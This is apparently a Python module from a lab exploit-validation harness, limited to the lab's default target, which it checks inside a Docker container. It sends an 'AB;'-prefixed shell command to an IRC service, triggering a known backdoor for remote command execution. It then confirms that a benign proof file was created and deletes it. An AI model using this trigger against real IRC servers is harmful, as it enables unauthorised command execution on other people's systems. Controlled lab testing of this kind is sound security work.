import socket
import subprocess
import time


def docker_exec(container: str, args: list[str], timeout: int = 15) -> subprocess.CompletedProcess:
    return subprocess.run(["docker", "exec", container, *args], capture_output=True, text=True, timeout=timeout, check=False)


def run(context: dict) -> dict:
    target = context["target"]
    capability = context["capability"]
    lab = context["lab"]
    default_target = lab["safety"]["default_target"]
    if target != default_target:
        return {
            "allowed": False,
            "verified": False,
            "exploited": False,
            "reason": f"Generated lab exploit validation is restricted to {default_target}.",
        }

    port = int((capability.get("match", {}).get("ports") or [6667])[0])
    marker = context.get("proof_marker", "/tmp/medflow_langgraph_exploit_poc")
    command = capability.get("proof_command", "id > {marker}").format(marker=marker)
    container = lab["docker_lab"]["container"]
    started = time.perf_counter()
    result = {
        "allowed": True,
        "target": target,
        "service": "irc",
        "port": port,
        "marker": marker,
        "proof_goal": capability.get("proof_goal", "Run configured benign proof command."),
        "verified": False,
        "exploited": False,
        "cleanup": False,
    }

    preclean = docker_exec(container, ["rm", "-f", marker])
    result["preclean"] = preclean.returncode == 0
    throttle_banners = []
    sent = False
    for connect_attempt in range(1, 7):
        try:
            with socket.create_connection((target, port), timeout=5) as sock:
                sock.settimeout(2)
                try:
                    banner = sock.recv(4096).decode("utf-8", errors="replace")
                except Exception:
                    banner = ""
                result["banner_preview"] = banner[:300]
                result["connect_attempts"] = connect_attempt
                if "throttled" in banner.lower():
                    result["throttle_observed"] = True
                    throttle_banners.append(banner[:300])
                    time.sleep(min(30, 8 + (connect_attempt * 4)))
                    continue
                sock.sendall(f"AB;{command}\n".encode("utf-8"))
                result["sent_benign_remote_command"] = True
                sent = True
                time.sleep(0.5)
                break
        except Exception as exc:
            result["error"] = repr(exc)
            if connect_attempt < 6:
                time.sleep(3)
                continue
            result["elapsed_seconds"] = round(time.perf_counter() - started, 3)
            return result

    if not sent:
        result["reason"] = "IRC service throttled all exploit validation connection attempts." if throttle_banners else "Could not send proof command to IRC service."
        result["throttle_banners"] = throttle_banners
        result["elapsed_seconds"] = round(time.perf_counter() - started, 3)
        return result

    verify = None
    for attempt in range(1, 11):
        time.sleep(0.5)
        verify = docker_exec(container, ["cat", marker])
        if verify.returncode == 0:
            result["verify_attempts"] = attempt
            break
    result["verify_returncode"] = verify.returncode
    result["proof_output"] = verify.stdout
    result["verify_stderr"] = verify.stderr
    result["verified"] = verify.returncode == 0
    result["exploited"] = verify.returncode == 0
    if not result["verified"]:
        result["reason"] = verify.stderr or "Proof file was not created by the IRC validation command."

    cleanup = docker_exec(container, ["rm", "-f", marker])
    result["cleanup"] = cleanup.returncode == 0
    cleanup_verify = docker_exec(container, ["test", "!", "-f", marker])
    result["cleanup_verified"] = cleanup_verify.returncode == 0
    result["elapsed_seconds"] = round(time.perf_counter() - started, 3)
    return result
